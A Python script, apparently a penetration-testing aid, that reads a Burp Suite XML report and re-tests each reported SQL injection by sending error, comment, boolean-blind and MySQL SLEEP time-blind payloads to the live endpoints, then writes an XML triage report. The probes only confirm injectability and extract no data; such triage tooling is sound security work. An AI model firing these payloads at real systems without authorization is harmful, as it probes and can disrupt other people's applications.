import requests
import time
import urllib.parse
import re
import base64
import os
import string
import xml.etree.ElementTree as ET
from xml.dom import minidom
from bs4 import BeautifulSoup

# ==========================================
# 1. USER CONFIGURATION
# ==========================================
BURP_XML_FILE = "burp_report.xml"
OUTPUT_XML_FILE = "sqli_triage_results.xml"

GLOBAL_COOKIES = {
    "session": "REPLACE_WITH_YOUR_ACTUAL_SESSION_COOKIE"
}

GLOBAL_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Vulnerability Validation Script 2026)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}

TIME_DELAY_THRESHOLD = 5.0
TIMEOUT_LIMIT = 12.0

DB_ERRORS = [
    r"SQLSTATE", r"syntax error near", r"unclosed quotation mark",
    r"MySQLQueryException", r"PostgreSQL JDBC Driver", r"Oracle error",
    r"MariaDB server version", r"Microsoft OLE DB Provider for ODBC Drivers"
]

# ==========================================
# 2. DYNAMIC SEGMENTATION ENGINE (BeautifulSoup)
# ==========================================

def split_burp_xml_by_type(master_file):
    """Parses master XML via BeautifulSoup and dynamically isolates SQLi issues."""
    print(f"[*] Analyzing master report: '{master_file}' using BeautifulSoup...")
    try:
        with open(master_file, "r", encoding="utf-8") as f:
            soup = BeautifulSoup(f.read(), "lxml-xml")
    except FileNotFoundError:
        print(f"[-] Segmentation failed: File '{master_file}' not found.")
        return False
    except Exception as e:
        print(f"[-] Segmentation failed to parse: {e}")
        return False

    issues = soup.find_all("issue")
    sqli_issues = []

    for issue in issues:
        issue_name = issue.find("name").text if issue.find("name") else "Unknown_Issue"
        issue_type_text = issue.find("type").text if issue.find("type") else ""
        
        if "sql" in issue_name.lower() or "sql" in issue_type_text.lower():
            sqli_issues.append(issue)

    print(f"[+] Found {len(sqli_issues)} SQLi issues")
    return sqli_issues

# ==========================================
# 3. UTILITY PARSERS & LOGGERS
# ==========================================

def parse_sqli_issues(issues_list):
    """Extracts SQLi findings from BeautifulSoup issue objects."""
    findings = []
    
    for issue in issues_list:
        url_element = issue.find("url")
        if url_element is None or not url_element.text:
            continue
            
        url = url_element.text
        location = issue.find("location").text if issue.find("location") else ""
        param_match = re.search(r"\[parameter\s+([^\]]+)\]", location, re.IGNORECASE)
        parameter = param_match.group(1) if param_match else None
        confidence = issue.find("confidence").text if issue.find("confidence") else "Unknown"
        
        method = "GET"
        request_element = issue.find("request")
        if request_element is not None:
            try:
                is_base64 = request_element.get("base64") == "true"
                raw_req = base64.b64decode(request_element.text).decode("utf-8", errors="ignore") if is_base64 else request_element.text
                if raw_req.startswith("POST"):
                    method = "POST"
            except Exception:
                pass

        findings.append({
            "url": url,
            "parameter": parameter,
            "method": method,
            "confidence": confidence
        })
    
    return findings

def send_request(session, base_url, method, params, target_param, payload):
    """Send HTTP request with payload injection."""
    test_params = params.copy()
    if target_param and target_param in test_params:
        test_params[target_param] = f"{test_params[target_param]}{payload}"
    elif target_param:
        test_params[target_param] = payload

    try:
        start_time = time.time()
        if method.upper() == "POST":
            response = session.post(base_url, data=test_params, headers=GLOBAL_HEADERS, 
                                   cookies=GLOBAL_COOKIES, timeout=TIMEOUT_LIMIT)
        else:
            response = session.get(base_url, params=test_params, headers=GLOBAL_HEADERS, 
                                  cookies=GLOBAL_COOKIES, timeout=TIMEOUT_LIMIT)
        elapsed_time = time.time() - start_time
        return response, elapsed_time
    except requests.exceptions.RequestException as e:
        return None, 0.0

def extract_url_params(url):
    """Extract base URL and query parameters."""
    parsed_url = urllib.parse.urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    params = urllib.parse.parse_qs(parsed_url.query)
    flat_params = {k: v[0] for k, v in params.items()}
    return base_url, flat_params

def format_request_xml(response, payload_used):
    """Format HTTP request for XML output."""
    if response is None:
        return None
    
    req = response.request
    req_headers = {k: v for k, v in req.headers.items()}
    req_body = req.body if req.body else ""
    
    request_elem = {
        "method": req.method,
        "path": req.path_url,
        "headers": req_headers,
        "body": req_body[:2000] if req_body else ""
    }
    
    return request_elem

def format_response_xml(response):
    """Format HTTP response for XML output."""
    if response is None:
        return None
    
    res_headers = {k: v for k, v in response.headers.items()}
    res_body = response.text[:2000] if len(response.text) > 2000 else response.text
    
    response_elem = {
        "status_code": response.status_code,
        "reason": response.reason,
        "headers": res_headers,
        "body": res_body
    }
    
    return response_elem

# ==========================================
# 4. ACTIVE VERIFICATION PIPELINE
# ==========================================

def verify_finding(session, issue):
    """Verify SQLi finding and collect all test data."""
    base_url, params = extract_url_params(issue['url'])
    param_to_test = issue['parameter']
    
    if not param_to_test:
        if params:
            param_to_test = list(params.keys())[0]
        else:
            return {
                "url": issue['url'],
                "parameter": param_to_test,
                "method": issue['method'],
                "confidence": issue['confidence'],
                "false_positive": True,
                "verdict": "Skipped (No explicit parameters found to inject)",
                "test_steps": []
            }

    print(f"[*] Triaging: {base_url} [{issue['method']}] -> Parameter: '{param_to_test}'")
    
    test_steps = []
    
    # --- Step 1: Establish Baseline ---
    baseline_resp, baseline_time = send_request(session, base_url, issue['method'], params, None, "")
    
    test_steps.append({
        "step_name": "BASELINE REQUEST",
        "payload": "[None - Original Query]",
        "request": format_request_xml(baseline_resp, ""),
        "response": format_response_xml(baseline_resp),
        "result": "Baseline established"
    })
    
    if baseline_resp is None:
        return {
            "url": issue['url'],
            "parameter": param_to_test,
            "method": issue['method'],
            "confidence": issue['confidence'],
            "false_positive": True,
            "verdict": "False Positive (Endpoint unreachable or dropped connection)",
            "test_steps": test_steps
        }
        
    baseline_size = len(baseline_resp.text)
    
    # --- Step 2: Error-Based Check ---
    err_payload = "'"
    err_resp, _ = send_request(session, base_url, issue['method'], params, param_to_test, err_payload)
    
    test_steps.append({
        "step_name": "ERROR INJECTION TEST",
        "payload": err_payload,
        "request": format_request_xml(err_resp, err_payload),
        "response": format_response_xml(err_resp),
        "result": "Error injection attempted"
    })
    
    if err_resp is not None:
        for pattern in DB_ERRORS:
            if re.search(pattern, err_resp.text, re.IGNORECASE):
                return {
                    "url": issue['url'],
                    "parameter": param_to_test,
                    "method": issue['method'],
                    "confidence": issue['confidence'],
                    "false_positive": False,
                    "verdict": "TRUE POSITIVE (In-Band: Confirmed database error leaked via regex patterns)",
                    "test_steps": test_steps
                }

    # --- Step 3: Direct Comment Syntax Check ---
    comment_payload = "' --"
    comment_resp, _ = send_request(session, base_url, issue['method'], params, param_to_test, comment_payload)
    
    test_steps.append({
        "step_name": "SYNTAX COMMENT REPAIR TEST",
        "payload": comment_payload,
        "request": format_request_xml(comment_resp, comment_payload),
        "response": format_response_xml(comment_resp),
        "result": "Comment syntax repair attempted"
    })
    
    if comment_resp is not None and comment_resp.status_code == 200:
        if err_resp is not None and err_resp.status_code != 200:
            return {
                "url": issue['url'],
                "parameter": param_to_test,
                "method": issue['method'],
                "confidence": issue['confidence'],
                "false_positive": False,
                "verdict": "TRUE POSITIVE (Structural: Comment sequence repairs query syntax)",
                "test_steps": test_steps
            }

    # --- Step 4: Boolean-Blind Test ---
    true_payload = "' AND '1'='1'--"
    false_payload = "' AND '1'='2'--"
    true_resp, _ = send_request(session, base_url, issue['method'], params, param_to_test, true_payload)
    false_resp, _ = send_request(session, base_url, issue['method'], params, param_to_test, false_payload)
    
    test_steps.append({
        "step_name": "BOOLEAN TRUE TEST",
        "payload": true_payload,
        "request": format_request_xml(true_resp, true_payload),
        "response": format_response_xml(true_resp),
        "result": "Boolean true condition tested"
    })
    
    test_steps.append({
        "step_name": "BOOLEAN FALSE TEST",
        "payload": false_payload,
        "request": format_request_xml(false_resp, false_payload),
        "response": format_response_xml(false_resp),
        "result": "Boolean false condition tested"
    })
    
    if true_resp is not None and false_resp is not None:
        size_diff_true = abs(len(true_resp.text) - baseline_size)
        size_diff_false = abs(len(false_resp.text) - baseline_size)
        
        if size_diff_true < 50 and size_diff_false > 200:
            return {
                "url": issue['url'],
                "parameter": param_to_test,
                "method": issue['method'],
                "confidence": issue['confidence'],
                "false_positive": False,
                "verdict": "TRUE POSITIVE (Boolean-Blind: Data changes layout based on truth logic)",
                "test_steps": test_steps
            }
        if true_resp.status_code == 200 and false_resp.status_code != 200:
            return {
                "url": issue['url'],
                "parameter": param_to_test,
                "method": issue['method'],
                "confidence": issue['confidence'],
                "false_positive": False,
                "verdict": "TRUE POSITIVE (Boolean-Blind: Status codes match boolean constraints)",
                "test_steps": test_steps
            }

    # --- Step 5: Time-Blind Test ---
    time_payload = f"' AND (SELECT 1 FROM (SELECT(SLEEP({int(TIME_DELAY_THRESHOLD)})))x)--"
    time_resp, test_time = send_request(session, base_url, issue['method'], params, param_to_test, time_payload)
    
    test_steps.append({
        "step_name": "TIME DELAY SELECTION TEST",
        "payload": time_payload,
        "request": format_request_xml(time_resp, time_payload),
        "response": format_response_xml(time_resp),
        "result": f"Time delay test ({test_time:.2f}s elapsed)"
    })
    
    if test_time >= TIME_DELAY_THRESHOLD and (test_time - baseline_time) > (TIME_DELAY_THRESHOLD - 1.0):
        shorter_threshold = 2.0
        short_payload = f"' AND (SELECT 1 FROM (SELECT(SLEEP({int(shorter_threshold)})))x)--"
        short_resp, control_time = send_request(session, base_url, issue['method'], params, param_to_test, short_payload)
        
        test_steps.append({
            "step_name": "TIME DELAY CONTROL VERIFICATION",
            "payload": short_payload,
            "request": format_request_xml(short_resp, short_payload),
            "response": format_response_xml(short_resp),
            "result": f"Control time test ({control_time:.2f}s elapsed)"
        })
        
        if control_time >= shorter_threshold and control_time < test_time:
            return {
                "url": issue['url'],
                "parameter": param_to_test,
                "method": issue['method'],
                "confidence": issue['confidence'],
                "false_positive": False,
                "verdict": "TRUE POSITIVE (Time-Blind: Thread execution pauses match payload values)",
                "test_steps": test_steps
            }

    return {
        "url": issue['url'],
        "parameter": param_to_test,
        "method": issue['method'],
        "confidence": issue['confidence'],
        "false_positive": True,
        "verdict": "False Positive (Could not simulate behavioral alterations)",
        "test_steps": test_steps
    }

# ==========================================
# 5. XML OUTPUT GENERATION
# ==========================================

def generate_xml_report(results, output_file):
    """Generate structured XML report from verification results."""
    root = ET.Element("findings")
    
    for result in results:
        finding_elem = ET.SubElement(root, "finding")
        
        # Basic info
        url_elem = ET.SubElement(finding_elem, "url")
        url_elem.text = result['url']
        
        param_elem = ET.SubElement(finding_elem, "parameter")
        param_elem.text = result['parameter'] if result['parameter'] else ""
        
        method_elem = ET.SubElement(finding_elem, "method")
        method_elem.text = result['method']
        
        confidence_elem = ET.SubElement(finding_elem, "confidence")
        confidence_elem.text = result['confidence']
        
        false_positive_elem = ET.SubElement(finding_elem, "false_positive")
        false_positive_elem.text = str(result['false_positive']).lower()
        
        verdict_elem = ET.SubElement(finding_elem, "verdict")
        verdict_elem.text = result['verdict']
        
        # Test steps
        test_steps_elem = ET.SubElement(finding_elem, "test_steps")
        
        for test in result['test_steps']:
            test_elem = ET.SubElement(test_steps_elem, "test")
            
            step_name_elem = ET.SubElement(test_elem, "step_name")
            step_name_elem.text = test['step_name']
            
            payload_elem = ET.SubElement(test_elem, "payload")
            payload_elem.text = test['payload']
            
            result_elem = ET.SubElement(test_elem, "result")
            result_elem.text = test['result']
            
            # Request
            if test['request']:
                request_elem = ET.SubElement(test_elem, "request")
                method_elem = ET.SubElement(request_elem, "method")
                method_elem.text = test['request']['method']
                
                path_elem = ET.SubElement(request_elem, "path")
                path_elem.text = test['request']['path']
                
                headers_elem = ET.SubElement(request_elem, "headers")
                for key, value in test['request']['headers'].items():
                    header_elem = ET.SubElement(headers_elem, "header")
                    header_elem.set("name", key)
                    header_elem.text = str(value)
                
                body_elem = ET.SubElement(request_elem, "body")
                body_elem.text = test['request']['body']
            
            # Response
            if test['response']:
                response_elem = ET.SubElement(test_elem, "response")
                status_elem = ET.SubElement(response_elem, "status_code")
                status_elem.text = str(test['response']['status_code'])
                
                reason_elem = ET.SubElement(response_elem, "reason")
                reason_elem.text = test['response']['reason']
                
                headers_elem = ET.SubElement(response_elem, "headers")
                for key, value in test['response']['headers'].items():
                    header_elem = ET.SubElement(headers_elem, "header")
                    header_elem.set("name", key)
                    header_elem.text = str(value)
                
                body_elem = ET.SubElement(response_elem, "body")
                body_elem.text = test['response']['body']
    
    # Pretty print
    xml_str = minidom.parseString(ET.tostring(root)).toprettyxml(indent="  ")
    # Remove extra blank lines
    xml_str = "\n".join([line for line in xml_str.split("\n") if line.strip()])
    
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(xml_str)
    
    print(f"\n[+] XML report saved to: {output_file}")

# ==========================================
# 6. MAIN EXECUTION
# ==========================================

if __name__ == "__main__":
    print("="*70)
    print(" BURP SUITE PRO - SQLi TRIAGE ENGINE WITH STRUCTURED XML OUTPUT")
    print("="*70 + "\n")
    
    sqli_issues = split_burp_xml_by_type(BURP_XML_FILE)
    
    if not sqli_issues:
        print("\n[+] No SQLi findings in the Burp report.")
    else:
        findings = parse_sqli_issues(sqli_issues)
        print(f"[+] Parsed {len(findings)} SQLi findings for testing\n")
        
        http_session = requests.Session()
        results = []
        
        for idx, finding in enumerate(findings, 1):
            print(f"\n[*] Testing finding {idx}/{len(findings)}...")
            result = verify_finding(http_session, finding)
            results.append(result)
        
        print("\n" + "="*70)
        print(" GENERATING XML REPORT")
        print("="*70)
        
        generate_xml_report(results, OUTPUT_XML_FILE)
        
        print("\n" + "="*70)
        print(" TRIAGE SUMMARY")
        print("="*70)
        
        true_positives = sum(1 for r in results if not r['false_positive'])
        false_positives = sum(1 for r in results if r['false_positive'])
        
        print(f"\nTotal findings: {len(results)}")
        print(f"True Positives: {true_positives}")
        print(f"False Positives: {false_positives}")
        
        for result in results:
            status = "✓ TP" if not result['false_positive'] else "✗ FP"
            print(f"\n{status} | {result['url']}")
            print(f"    Parameter: {result['parameter']}")
            print(f"    Verdict: {result['verdict']}")
